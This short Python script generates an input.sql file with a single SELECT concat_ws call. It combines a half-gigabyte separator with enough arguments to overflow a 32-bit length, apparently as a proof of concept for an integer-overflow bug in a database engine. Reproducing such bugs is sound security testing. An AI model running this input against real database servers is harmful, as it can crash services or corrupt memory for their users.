# python代码以生成input.sql文件
# Create a file named 'input.sql' for testing the overflow vulnerability

# Define a very large separator that should cause int overflow
sep_length = 1 << 29  # This is 2^29 which is a large value but still manageable in memory
sep = "A" * sep_length

# Define just enough arguments to cause the overflow when multiplied by sep_length
# The minimum number of entries that is needed to surpass the int limit would be calculated
# Suppose for the overflow we need just as many arguments so that when multiplied by our separator length, it exceeds 2^31-1
num_of_args = (1 << 31) // sep_length + 1

# List of only a few dummy entries, while counting 
args = ["'arg'" for _ in range(num_of_args)]

# Construct the SQL input command
sql_command = f"SELECT concat_ws('{sep}', {', '.join(args)});"

# Write the SQL command to the 'input.sql' file
with open('input.sql', 'w') as file:
    file.write(sql_command)

print("Input SQL file 'input.sql' has been generated with large separator and enough arguments for overflow.")
